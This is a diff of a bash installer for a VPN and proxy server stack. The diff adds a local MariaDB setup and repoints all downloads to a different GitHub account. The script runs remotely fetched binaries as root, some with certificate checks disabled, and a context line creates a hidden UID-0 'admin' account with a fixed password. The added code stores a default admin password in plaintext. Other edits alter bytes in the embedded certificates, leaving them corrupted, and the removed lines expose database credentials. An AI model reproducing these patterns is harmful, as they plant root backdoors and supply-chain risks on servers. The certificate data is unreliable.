@@ -1,15 +1,15 @@
 #!/bin/bash
-#Script Variables
-HOST='69.10.62.204';
-USER='privateh5_privatehub';
-PASS='privateh5_privatehub';
-DBNAME='privateh5_privatehub';
-PORT_TCP='1194';
-PORT_UDP='110';
-PORT_SSL='443';
-OBFS='privatehub';
-HYSTERIA_TYPE='default';
-API_KEY='DexterEskalarte';
+#Script Variables - MODIFIED FOR LOCAL DATABASE
+HOST='localhost'
+USER='vpnadmin'
+PASS='vpn@Password123'
+DBNAME='vpndb'
+PORT_TCP='1194'
+PORT_UDP='110'
+PORT_SSL='443'
+OBFS='privatehub'
+HYSTERIA_TYPE='default'
+API_KEY='DexterEskalarte'
 
 apt update
 wget -O autodns "https://raw.githubusercontent.com/magi17/betav/refs/heads/main/autodns/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
@@ -44,8 +44,12 @@ apt install -y curl wget cron python-minimal libpython-stdlib
 apt install -y iptables sudo
 apt install -y openvpn netcat httpie php neofetch vnstat
 apt install -y screen squid stunnel4 dropbear gnutls-bin python
-apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
+apt install -y dos2unix nano unzip jq virt-what net-tools
 apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
+
+# INSTALL MYSQL SERVER (NEW)
+echo "Installing MySQL/MariaDB server..."
+apt install -y mariadb-server mariadb-client
 
 touch /var/spool/cron/crontabs/root && chmod 600 /var/spool/cron/crontabs/root
 systemctl start cron && systemctl enable cron
@@ -58,6 +62,95 @@ mkdir -m 777 /root/.web
 clear
 }&>/dev/null
 clear
+}
+
+# NEW FUNCTION: Setup Local Database
+setup_local_database() {
+clear
+echo "Setting up local database..."
+{
+# Start and enable MariaDB
+systemctl start mariadb
+systemctl enable mariadb
+
+# Secure MySQL installation
+mysql -e "DELETE FROM mysql.user WHERE User='';"
+mysql -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');"
+mysql -e "DROP DATABASE IF EXISTS test;"
+mysql -e "DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';"
+
+# Create VPN database and user
+mysql -e "CREATE DATABASE IF NOT EXISTS $DBNAME;"
+mysql -e "CREATE USER IF NOT EXISTS '$USER'@'localhost' IDENTIFIED BY '$PASS';"
+mysql -e "GRANT ALL PRIVILEGES ON $DBNAME.* TO '$USER'@'localhost';"
+mysql -e "FLUSH PRIVILEGES;"
+
+# Create tables
+mysql -u $USER -p$PASS -D $DBNAME <<EOF
+CREATE TABLE IF NOT EXISTS users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    user_name VARCHAR(50) NOT NULL UNIQUE,
+    password VARCHAR(255) NOT NULL,
+    auth_vpn VARCHAR(255) NOT NULL,
+    status ENUM('live', 'expired', 'banned') DEFAULT 'live',
+    duration INT DEFAULT 30,
+    vip_duration INT DEFAULT 0,
+    private_duration INT DEFAULT 0,
+    is_connected TINYINT(1) DEFAULT 0,
+    device_connected INT DEFAULT 0,
+    active_address VARCHAR(50),
+    active_date DATETIME,
+    is_freeze TINYINT(1) DEFAULT 0,
+    is_ban TINYINT(1) DEFAULT 0,
+    connection_limit INT DEFAULT 1,
+    date_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE IF NOT EXISTS bandwidth_logs (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(50) NOT NULL,
+    server_ip VARCHAR(50),
+    server_port INT,
+    timestamp DATETIME,
+    ipaddress VARCHAR(100),
+    since_connected VARCHAR(100),
+    bytes_received BIGINT DEFAULT 0,
+    bytes_sent BIGINT DEFAULT 0,
+    time_in DATETIME,
+    time_out DATETIME,
+    status ENUM('online', 'offline') DEFAULT 'offline',
+    time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE IF NOT EXISTS bandwith_logs (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(50) NOT NULL,
+    server_ip VARCHAR(50),
+    server_port INT,
+    timestamp DATETIME,
+    ipaddress VARCHAR(100),
+    since_connected VARCHAR(100),
+    bytes_received BIGINT DEFAULT 0,
+    bytes_sent BIGINT DEFAULT 0,
+    time_in DATETIME,
+    time_out DATETIME,
+    status ENUM('online', 'offline') DEFAULT 'offline',
+    time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+EOF
+
+# Create a default admin user
+default_pass="admin123"
+hashed_pass=$(echo -n "$default_pass" | md5sum | awk '{print $1}')
+mysql -u $USER -p$PASS -D $DBNAME <<EOF
+INSERT INTO users (user_name, password, auth_vpn, status, duration, connection_limit) 
+VALUES ('admin', '$default_pass', '$hashed_pass', 'live', 365, 2)
+ON DUPLICATE KEY UPDATE password='$default_pass', auth_vpn='$hashed_pass';
+EOF
+
+echo "Local database setup complete!"
+echo "Default admin user: admin / $default_pass"
+}&>/dev/null
 }
 
 install_squid(){
@@ -80,7 +173,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
     update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
     update-alternatives --set c++ /usr/bin/g++
     cd /usr/src
-    wget https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/proxy/squid-3.1.23.tar.gz
+    wget https://raw.githubusercontent.com/magi17/betav/refs/heads/main/proxy/squid-3.1.23.tar.gz
     tar zxvf squid-3.1.23.tar.gz
     cd squid-3.1.23
     ./configure --prefix=/usr \
@@ -94,7 +187,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/proxy/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/magi17/betav/refs/heads/main/proxy/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -119,29 +212,29 @@ visible_hostname Dexter-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
-    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/socks.py' -O /etc/socks.py
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/socks/socks.py' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/socks-ssh.py' -O /etc/socks-ssh.py
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/socks/socks-ssh.py' -O /etc/socks-ssh.py
 dos2unix /etc/socks-ssh.py
 chmod +x /etc/socks-ssh.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/websocket/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
 dos2unix /etc/socks-ws-ssh.py
 chmod +x /etc/socks-ws-ssh.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/websocket/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
 dos2unix /etc/socks-ws-ssl.py
 chmod +x /etc/socks-ws-ssl.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/repo/monitorz' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/ws' -O /etc/.ws
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/repo/hysteria' -O /etc/.hysteria
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/repo/monitorz' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/websocket/ws' -O /etc/.ws
+wget 'https://raw.githubusercontent.com/magi17/betav/refs/heads/main/repo/hysteria' -O /etc/.hysteria
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 chmod +x /etc/.hysteria
@@ -395,7 +488,7 @@ vp52T4fMOgOhnkg/EZIzOxkWnNBdFu7BQmeZR2ZnZwIDAQABo4GuMIGrMAkGA1Ud
 EwQCMAAwHQYDVR0OBBYEFGsIwGQQcagyfwv+HpgfvXJ0D8hmMEoGA1UdIwRDMEGA
 FGRJMm/+ZmLxV027kahdvSY+UaTSoROkETAPMQ0wCwYDVQQDDARLb2JaghQBpAEC
 kxLZ1gGpg9wDc9rtyOPDtzATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
-BaAwEQYDVR0RBAowCIIGc2VydmVyMA0GCSqGSIb3DQEBCwUAA4GBAKE+rIML5V3K
+BaAwEQYDVR0RBAowCIIGc2VydmVyMA0GCSqGSIb3DQEBCsUAA4GBAKE+rIML5V3K
 NrfQq9DZc2bRYojOPUeeCAugW1ET/H7XbhcOvfXZqdkGeFKIWuXf0zIiSksIb7Ei
 gE8Z0V+dtloX961wqQQA//6EquHLDnTAGnULPpiQHSK6pHomZX3RO1xFoXci7bZr
 GKPE7j4GuwvsEqwWpVCz7UZDh3L9dYw4
@@ -515,7 +608,7 @@ jgjgxgxbitApzno0E2Pq/Kg=
 -----BEGIN CERTIFICATE-----
 MIIDRTCCAi2gAwIBAgIUOvs3vdjcBtCLww52CggSlAKafDkwDQYJKoZIhvcNAQEL
 BQAwMjEQMA4GA1UEAwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNV
-BAYTAlBIMB4XDTIxMDcwNzA1MzQwN1oXDTMxMDcwNTA1MzQwN1owMjEQMA4GA1UE
+BAYTAlBIMB4XDTIxMDcwNzA5MzQwN1oXDTMxMDcwNTA5MzQwN1owMjEQMA4GA1UE
 AwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNVBAYTAlBIMIIBIjAN
 BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApZoAnZu0QdlVisHx/Bzv0/W8RHXV
 g7Ad3ySqTP7YlTLeLP1jHRibRXUZcc1G9N7vh0+rdNLC5We/IJ4I8S6SRhaRwBnV
@@ -576,7 +669,7 @@ chmod 755 stunnel4 && chmod 755 dropbear
 
 echo "/bin/false" >> /etc/shells
 
-#//wget -O /etc/banner #"https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/banner/SshBanner"
+#//wget -O /etc/banner #"https://raw.githubusercontent.com/magi17/betav/refs/heads/main/banner/SshBanner"
 chmod +x /etc/banner
 
 useradd -p $(openssl passwd -1 kaldag2) admin -ou 0 -g 0
@@ -609,9 +702,9 @@ mkdir -m 777 $DNSCONFIG
 
 # BUILD DNSTT SERVER
 cd $DNSDIR/dnstt/dnstt-server
-wget -O dnstt-server "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/slowdns/dnstt-server"
+wget -O dnstt-server "https://raw.githubusercontent.com/magi17/betav/refs/heads/main/slowdns/dnstt-server"
 chmod +x dnstt-server
-wget -O dnstt-client "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/slowdns/dnstt-client"
+wget -O dnstt-client "https://raw.githubusercontent.com/magi17/betav/refs/heads/main/slowdns/dnstt-client"
 chmod +x dnstt-client
 
 ./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
@@ -696,11 +789,6 @@ Whatsapp Contact: +639709310250
 
 " >> /root/.web/$secretkey.txt
 
-#wget -O /root/.dns/dig.sh "firenetvpn.net/files/repo/dig.sh"
-#chmod +x /root/.dns/dig.sh
-#sed -i "s|DOMAIN_LENZ|$NS|g" /root/.ports
-#sed -i "s|HOSTNAME_LENZ|$DOMAIN|g" /root/.ports
-
 #install client-sldns.service
 cat > /etc/systemd/system/client-sldns.service << END
 [Unit]
@@ -765,7 +853,7 @@ install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/magi17/betav/refs/heads/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -819,7 +907,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/badvpn/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/magi17/betav/refs/heads/main/badvpn/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -935,6 +1023,7 @@ serverVersion=$(awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower
 
 #install_sudo
 install_require  
+setup_local_database  # NEW: Setup local database
 install_hysteria
 installBBR
 install_squid
